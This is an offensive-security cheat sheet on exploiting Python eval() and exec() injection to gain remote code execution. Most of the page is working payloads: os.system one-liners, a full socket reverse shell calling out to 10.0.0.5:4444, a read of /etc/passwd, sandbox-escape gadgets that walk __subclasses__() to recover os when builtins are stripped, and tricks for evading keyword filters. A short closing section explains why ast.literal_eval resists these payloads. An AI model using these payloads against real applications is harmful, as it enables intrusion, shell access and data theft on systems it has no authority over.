---
title: "Python eval() and exec() code injection to RCE"
description: "User input reaching eval or exec compiles and runs arbitrary Python; builtins give a one-liner shell, and class traversal rebuilds the path to os when builtins are stripped."
keywords:
  - python eval injection
  - exec arbitrary code
  - __import__ os system
  - subclasses gadget
  - restricted builtins bypass
  - literal_eval safe
---

# eval() and exec()

`eval` compiles a string as a Python expression and runs it; `exec` does the same for statements. Both execute in the interpreter with the privileges of the process, so any user input that reaches either call is arbitrary code execution, not a sanitization problem. The input is not data passed to a parser, it is source code handed to the compiler.

## The sink

```python
# user input evaluated as a Python expression
result = eval(request.args["formula"])
```

Anything that is a valid Python expression runs. A calculator endpoint that expects `2 + 2` runs whatever else is sent in its place.

## Direct execution through builtins

By default `eval` and `exec` run with full access to `__builtins__`, so the shortest path is to call out to the operating system directly:

```python
__import__('os').system('id')
__import__('os').popen('id').read()
__import__('subprocess').check_output(['id'])
```

`__import__('os').system('id')` is a single expression, so it works in `eval` unchanged. For a reverse shell or anything multi-statement, `exec` accepts statements and semicolons:

```python
exec("import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.5',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])")
```

Other builtins are equally good entry points when `os` is watched for:

```python
getattr(__builtins__, 'eval')("__import__('os').system('id')")
open('/etc/passwd').read()
globals()['__builtins__'].__import__('os').system('id')
```

## exec for statements

`eval` only evaluates a single expression, so assignments, imports as statements, loops, and function definitions raise `SyntaxError` there. Where the sink is `exec`, the full statement grammar is available and payloads do not have to be squeezed into expression form:

```python
exec("for i in range(1): __import__('os').system('id')")
exec("def p():\n import os; return os.popen('id').read()\nprint(p())")
```

When only `eval` is reachable but a statement is needed, wrap the statement so it becomes an expression: `eval("exec('import os; os.system(\\'id\\')')")` runs `exec` as a call, and `eval` is happy because a call is an expression.

## Restricted builtins and the class-traversal bypass

A common hardening attempt is to strip builtins by passing an explicit globals mapping:

```python
# intended to be "safe"
eval(user_input, {'__builtins__': {}})
```

With `__builtins__` emptied, `__import__`, `open`, and `getattr` are gone, so the direct payloads above raise `NameError`. They are not needed. Every object still exposes the class hierarchy, and from any literal the interpreter walks back up to `object` and then down to a class that imports or runs commands. The canonical walk starts from an empty tuple:

```python
().__class__.__bases__[0]
```

That is `object`. Its `__subclasses__()` lists every loaded class, and the attack picks one whose methods reach `os` or `subprocess`. Two reliable gadgets:

```python
# walk to a class that can run a command via subprocess.Popen
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'Popen'][0](['id'])

# reach os through the function globals of warnings.catch_warnings,
# selected by name because its index is not stable across versions
[c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__=='catch_warnings'][0].__init__.__globals__['__builtins__']['__import__']('os').system('id')
```

The index into `__subclasses__()` is deployment-specific, so the technique is to enumerate the list first and select by `__name__` rather than hardcoding a position:

```python
# enumerate to find the gadget index on the target
[(i, c.__name__) for i, c in enumerate(().__class__.__bases__[0].__subclasses__())]
```

Any class that carries a `__globals__` with `__builtins__` (most module-level functions do) hands back a full builtins dictionary, which re-imports `os` and defeats the empty-`__builtins__` restriction entirely. Blocking the names `os`, `system`, `eval`, `import`, or underscores by string filtering is bypassed with `getattr` chains, attribute names built from `chr()`/string concatenation, or `\x6f\x73`-style escapes, since the evaluator sees the reconstructed string regardless of how it was spelled.

## ast.literal_eval is not a sink

`ast.literal_eval` is frequently confused with `eval` and is the correct comparison point: it parses the string into an AST and evaluates only literal nodes, strings, numbers, tuples, lists, dicts, sets, booleans, and `None`. It never calls functions, never resolves names, and never touches builtins or the class hierarchy:

```python
import ast
ast.literal_eval("[1, 2, 3]")          # returns the list
ast.literal_eval("__import__('os')")   # raises ValueError, not a call
ast.literal_eval("().__class__")       # raises ValueError: malformed node
```

Every payload on this page fails against `literal_eval` because none of them are pure literals. An application that uses `literal_eval` to turn a user-supplied list or dict string into an object is not an expression-evaluation sink; one that uses `eval` for the same convenience is. The distinction is the whole exposure, so confirm which function the target actually calls before assuming execution.

## Tools

- **Burp Suite**: Repeater for delivering eval/exec payloads and reading results.
- **tplmap**: detects and exploits Python eval()/exec() code injection.
- Manual `__subclasses__()` gadget payloads when builtins are stripped.

## References

- [Python: eval built-in](https://docs.python.org/3/library/functions.html#eval)
- [Python: exec built-in](https://docs.python.org/3/library/functions.html#exec)
- [Python: ast.literal_eval](https://docs.python.org/3/library/ast.html#ast.literal_eval)
- [PayloadsAllTheThings: Python code execution via eval](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization/Python.md)
